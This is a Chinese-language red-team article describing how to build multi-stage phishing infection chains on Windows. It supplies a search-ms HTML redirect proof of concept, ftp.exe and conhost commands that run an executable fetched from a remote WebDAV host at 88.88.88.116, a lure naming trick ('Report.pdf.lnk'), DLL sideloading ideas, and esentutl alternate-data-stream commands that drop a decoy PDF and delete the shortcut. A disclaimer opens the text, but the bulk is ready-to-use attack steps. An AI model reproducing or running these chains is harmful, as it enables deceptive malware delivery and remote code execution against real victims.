---
title: 红队攻防-多阶段感染链
url: https://mp.weixin.qq.com/s/kRGAVrCpqOSv9k36rAU-qQ
source: Doonsec's feed
date: 2026-03-24
fetch_date: 2026-03-25T04:13:15.838999
---

# 红队攻防-多阶段感染链

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/1ibFic8ns5ft4lv9icF8nicBQFPg4ic2TQuk4zWtib2nj8HD6INGfQZYRvSlrLZuwtmDJI1FAalib0QJ0ACZZSId76INuyWTg00oAGIwjRqam51dOk/0?wx_fmt=jpeg)

# 红队攻防-多阶段感染链

kernel
kernel

Relay学安全

![]()

在小说阅读器中沉浸阅读

免责声明

本文所有内容仅供**网络安全学习与研究**之用，旨在提升安全意识、探讨防御技术。读者必须承诺并保证仅将所述知识用于**合法、授权**的环境。

严禁任何个人或组织将本文提及的任何技术、方法或工具用于**任何非法入侵、破坏、窃取数据等恶意活动**。由此产生的任何直接或间接法律责任及后果均由行为人自行承担，与本文作者及发布平台无关。

作者力求内容准确，但技术发展迅速，本文不提供任何明示或暗示的担保。读者应在模拟环境或已获得明确授权的目标中进行实践。

互联网上有很多分析恶意APT团队去做的一些攻击思路，它们首先会将目标诱导到一个登录页面，然后通过HTML走私的方式释放出一个Zip压缩包文件，然后在Zip压缩包文件中存在着一个`Lnk`快捷方式文件，接着通过`Lnk`快捷方式执行并拉取一个`VBS`脚本，最后由VBS运行Powershell命令，诸如此类的思路。

这就是我们所说的复杂感染链，本质上就是把多个文件串联起来，组成一个完整的链路。

首先每一个感染链都由三个特定的组件构成。

1. 投递: 怎么投递你的恶意文件或压缩包，比如HTML走私？直接加上微信发给对方？等等....
2. 容器: 你要投递的恶意文件用什么容器来包裹？比如ZIP,ISO,PDF,VHD？
3. 触发器: 在容器中会有很多文件，其中会有一个文件作为触发器，比如Lnk文件，它负责在系统中执行命令，而这条命令将真正的入侵系统并破坏资产。同时在触发器旁边会有一个诱饵文档，用来向受害者确保一切如预期般的正常，比如说受害者打开一个图标为PDF的Lnk恶意文件，该Lnk文件在执行完恶意命令后，会真正的打开一个正常的PDF文档。

比如说在Zip这种容器中，我们可以将其他文件都隐藏起来，只留下一个`Lnk`文件，诱导受害者打开。

一个简单的案例是: 邮件里面有一个HTML走私的链接，引诱受害者访问HTML走私页面，然后释放ISO镜像文件，该ISO容器中包含一个`Lnk`文件和一个DLL文件，然后通过Lnk文件直接通过`Rundll32`去执行该DLL的导出函数。

这就是我们所说的复杂链感染，**所以首先是钓鱼邮件或HTML走私或直接发送给对方，接着然后交付ISO或Zip容器文件，然后就是触发器，这个触发器可以是Lnk，也可以是可执行文件。**

首先是如何投递文件，我们可以利用HTML走私或SVG走私的方式来进行投递容器。如果你的环境允许你也可以使用邮件的附件进行投递。

当然我觉得最简单的方式就是获取对方的信任，只要获取到了对方的信任，无论你如何投递都是没什么问题的。

这里介绍一种通过协议处理程序配合WebDav的投递方式。他的工作原理如下:

首先诱导受害者访问一个网站，该网站会将用户重定向到一段特定的`JS`代码中，这段JS代码会动态构建或使用一个特定的URL，并将其赋值给`Location`对象，从而触发浏览器的重定向。

这种重定向的目标方案是`search-ms`，由于这是`Windows`默认注册的处理程序，他会调用`Search-MS`子系统，随后作为`Windows`搜索服务的`Search-Ms`会弹出一个资源管理器窗口。

如下POC:

```
<html><head>    <title>search-ms</title>    <script>        window.location.href = 'search-ms:query=sfe_wscreg&crumb=location:\\\\127.0.0.1\\DavWWWRoot&displayname=relaysec';    </script></head><body><center>		relaysec</center></body></html>
```

我们来解释这一下这块`Javascript`代码。

这里的`query`参数决定了只显示匹配到该关键字的文件，也就是说假如我们的`webdav`服务器上存在3个文件，一个白程序，一个黑DLL以及一个Shellcode，白程序的名称为: `sfe_wscreg.exe`，而这里设置`query`为`sfe_wscreg`，这意味着只会显示白程序这一个文件，当然这里为了演示所以显示的可执行程序，你可以显示一个图标为PDF的`Lnk`文件来诱导目标去点击。

这里的`Location`参数指向的是远程服务器`WebDav`的路径，这里因为是本地通过Python的库搭建的，所以这里为127.0.0.1，在实战的情况下，一般我们会设置一个域名。

这里的`displayname`参数的值会显示在资源管理器窗口标题栏以及导航栏中。

现在我们将该HTML文件挂载在CloudFlare中。当打开时，这里将提示你是否打开`Windows`资源管理器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ibFic8ns5ft7XEictyeafjTDKicRkASicbgF7ibpWoCzqdpFhELhSLayrIEbwQ9mKia6ob9kYAKYWLhkazhfa1sfpdT9KW8nibOdcxF9oqw3ZbRe2M/640?wx_fmt=png&from=appmsg)

**当我们点击打开`Windows`资源管理器后将匹配到我们`query`参数所设置的文件，那么这里你可以将其设置为PDF或`Lnk`文件会更好。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ibFic8ns5ft7iaia5vy0oxQibbC64vXlWVQ1mLBlPYtQU1HJN9GNFItR4PNsJQrEEsb1772Hb5C6icfxWnXk4U9hZvib6SQ4HYic43wFEhplMv5XDE/640?wx_fmt=png&from=appmsg)

所以现在有很多通过这种方式来进行投递。

关于容器我们可以使用Zip，ISO来进行包含隐藏文件。

现在我们主要依靠与`Lnk`和`CHM`帮助文档来在系统中执行命令，有时我们还会考虑将`ClickOnce`或MSI作为触发器。

关于有效载荷的话，比如我们可以包含一个合法签名的白程序，以及黑DLL文件，利用DLL测加载的方式去加载这个DLL文件，我们可以通过`Lnk`去执行那个白程序，执行之后紧接着打开一个正常的PDF文件。

此外还有`.cpl`控制面板文件，它也可以作为触发器，还有VBA项目文件等等。

还有类似于MSI的文件，比如我们首先在正常的MSI文件植入后门等等。

这里我们使用`ftp.exe`来做一个测试。比如说我们要通过`ftp.exe`来执行命令，当然这种方式是通过`LOLBINS`网站中找到的。

该命令的原理是首先将`!cmd /c c:\windows\system32\calc.exe`这条命令写入到文件中，然后通过`ftp.exe`的`-s`参数来去执行。

```
echo !cmd /c c:\windows\system32\calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
```

**这里我们尝试去执行一下。**

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft4P0TRuSiadwc43q3wWlPBN66rmT3HcxtMrM9Cj1ZFWH3S6P3HrrtuGGo4wdKKSPc5XqNHugQXp7mZbd78dh7G9TB2HS0Wz1sFU/640?wx_fmt=png&from=appmsg)

**写入的文件:**

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft43s867f3BSHIq2G9JTfTNTgb4tz5uNKCE455aPgTOhTkb0Nz06DCFmBKn0jbdMsthDFffNPSeJ6WVcjxSyXaqYiaLDD6X1iaPcU/640?wx_fmt=png&from=appmsg)

那么现在我们要对其进行变种操作了，我们需要让其可以执行我们的白程序，而且我们需要投递的文件只能是一个`Lnk`文件。

那么我们首先需要解决的是要通过`ftp`去执行我们的白程序。

```
echo !C:\Windows\System32\conhost.exe --headless conhost conhost conhost \\127.0.0.1\DavWWWRoot\webdav\sfe_wscreg.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
```

**例如这条命令，我们通过`conhost`来去执行挂载在`WebDav`服务下的`sfe_wscreg.exe`。可以看到成功执行。**

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft6WCOyrB9jSA6icnibbk0ibVibMQmq0Xpfw4yAIkY4MyS5D0n1K5UMQjAl7ibt3IFic5YziaiaqQsiaNia3ITp2QPGtmrsDtEh7OQJ2YNawc/640?wx_fmt=png&from=appmsg)

**进程链如下:**

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft4BfJEM4IvqX7nKhYjQsFRxnEpR5ImUG3QeryOj7xWWXAaCQx8xBwdkIVBdVbZXSF2HaJxoJEV5KvYLsO9eYb5rPvcVkOr7wick/640?wx_fmt=png&from=appmsg)

我们再次转变一下思路，既然白程序可以挂载在`WebDav`下，那么这是不是意味着，`ftpcommands.txt`也可以挂载在`WebDav`下呢？

我们在`Webdav`目录下创建该文件，并写入:

```
!C:\Windows\System32\conhost.exe --headless conhost conhost conhost \\88.88.88.116@8011\DavWWWRoot\webdav\sfe_wscreg.exe
```

**现在我们只需要将其`Lnk`指向`ftp.exe`，后续的命令只需要写成这样即可:**

```
C:\Windows\System32\ftp.exe -s:\\88.88.88.116@8011\DavWWWRoot\webdav\ftpcommands.txt
```

**那么这样也是可以调用的。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ibFic8ns5ft4cEicnD1p5XgzRxkqGlZSkuCsNSRr6uCsByE0bIU5S66BpYNq87qlgOxdtNeKqjSMV8xHTcySyq0lO18gWHahvYV8fr1ia4YMV8/640?wx_fmt=png&from=appmsg)

**最好可以再打开一个正常的PDF文件，比如我们将其`ftpcommands.txt`文件写入成这样。**

```
!C:\Windows\System32\conhost.exe --headless conhost conhost conhost \\88.88.88.116@8011\DavWWWRoot\webdav\sfe_wscreg.exe && \\88.88.88.116@8011\DavWWWRoot\webdav\test.pdf
```

**如下图我们可以看到执行完白程序后，将打开`test.pdf`文件。**

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft5mJbo32D4bhE9koHibI39GTkx3DBkqCga2iaFuUMF6FkvMlXQapic0zrmaAJ2bBrtZ5rXlNPguibZ8FtZdzdvyhmgibb1nXibbwCIB8/640?wx_fmt=png&from=appmsg)

**那么一般的话我们会将Lnk文件直接发送给受害者，所以一般这么去命名即可: `Report.pdf.lnk`，因为即使在系统上开启了 "显示文件扩展名" 选项，`.lnk`后缀依然会被隐藏掉。**

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft58OfqUGvxE5FPZviaiblrdZAUynJW78ZgSAdTZ6EcKd1Q9xYOvt3TicocVSHEypApLC5DjKoBN7gnibtkiclglGhl1ArtLrILHjlYM/640?wx_fmt=png&from=appmsg)

接下来我们来聊另外一种感染链思路，这种感染链是通过`esentutl`备份数据流工具来做的。

主要参考于: `https://medium.com/@pjbmalware/urelas-leveraging-alternate-data-streams-in-lnk-files-d3d514811fbc`。

如下链接:

```
https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
```

我们主要关注于替代数据流，它可以将源文件复制到目标文件的备用数据流ADS。当然也可以将源备用数据流ADS复制到目标EXE。

主要是这两条命令:

```
esentutl.exe /y C:\Windows\Temp\file.exe /d C:\Windows\Temp\file.ext:file.exe /oesentutl.exe /y C:\Windows\Temp\file.ext:file.exe /d C:\Windows\Temp\file.exe /o
```

**那么其实我们可以稍微的改改就可以了，我们可以将其真正的PDF文件复制到`Lnk`文件的备用数据流。**

```
esentutl.exe /y "Xftp7_ko.pdf" /d "Res.pdf.lnk:file.exf" /o
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ibFic8ns5ft5ffcLcpWVzHO2LfuP1PQwncDYT1x8QNuPBTXBncbNRvga0K54eDXK2TLxKibfBiartkOsgibhggl3LMWAOe0ClX2BqQibJA2Ap3yQ/640?wx_fmt=png&from=appmsg)

下一步则是释放PDF文件。

```
esentutl.exe /y "Res.pdf.lnk:file.exf" /d "Xftp7_ko.pdf" /o
```

但是我们似乎可以在本地测试成功，但是如果你放到其他机器上你会发现它报错了。

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft4icWZTtybia1HPBOYXCxrrr8lJyPNLicSVmIfaLaKTkicRhYiaHhWXn6TiaiaSOUAsLX0oHzN5iayOLZTYzbWXRN8mb2CKct6xplRicQWY/640?wx_fmt=png&from=appmsg)

这通常是因为你只把`Res.pdf.lnk`文件复制到其他机器上了，但是你并没有将`file.exf`复制过去。

所以这里我们就要需要通过`WINRAR`来对其Lnk文件进行压缩，需要注意的是这里似乎只有`Winrar`可以勾选数据流选项，其他比如7zip，BandZip似乎都不支持。

我们对其进行压缩，勾选保存数据流。

![](https://mmbiz.qpic.cn/mmbiz_png/1ibFic8ns5ft6Rf2P6pZ93DGXZI2gbrUOK4wkknC6C6BicUeCLiaA7Zpb3u9sibGFec0nJqjJv4KzDAqS2C3Umw07g5E8M0mK54rHJwpiajwdmW9Q/640?wx_fmt=png&from=appmsg)

从压缩的文件中我们可以看到文件的大小明显有了变化，变得稍微有点大了，这就是因为数据流也被压缩进去了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ibFic8ns5ft720vjQGznicasn5KRjYrAcsdW3ryFN5Ecj5yQaqlfAJPgBZHxOkpmSlg2vRfQ6hDO2y4bc1xBF3rhNictqJsn3YEzXbhWTL8tdE/640?wx_fmt=png&from=appmsg)

现在你只需要将这个压缩包发送给对方即可，当他通过Winrar解压并且运行`Lnk`文件时就会释放出我们正常的PDF文件。

当然你的Lnk中需要指向这条命令:

```
%WINDIR%\System32\esentutl.exe /y "Res.pdf.lnk:file.exf" /d "Xftp7_ko.pdf" /o
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ibFic8ns5ft6BOjLzPPs8YmSUcliaIZISiaEVicrINyMcc1tf6EOMFs6EKhiaEeKOwGwFu8V2tjibIdJtL7UKj8Dy2PrepMdaQNAkV63XwImhJvKg/640?wx_fmt=png&from=appmsg)

可以看到当执行命令后将成功释放该文件。我们也可以加上比如`Start`命令来启动该PDF文件，保证目标以为是打开的一个正常的文件。

根据上面的思路，也可以对其进行判断操作，比如说判断该文件是否已经存在，如果存在的话则直接使用`Start`来启动合法的PDF文件，并且删除`.lnk`文件，确保只留下一个`PDF`文件。

```
/c esentutl.exe /y "%cd%\Res.pdf.lnk:file.exf" /d "%cd%\Xftp7_ko.pdf" /o & IF EXIST "%cd%\Xftp7_ko.pdf" (start "" "%cd%\Xftp7_ko.pdf" & del "%cd%\Res.pdf.lnk") ELSE msg...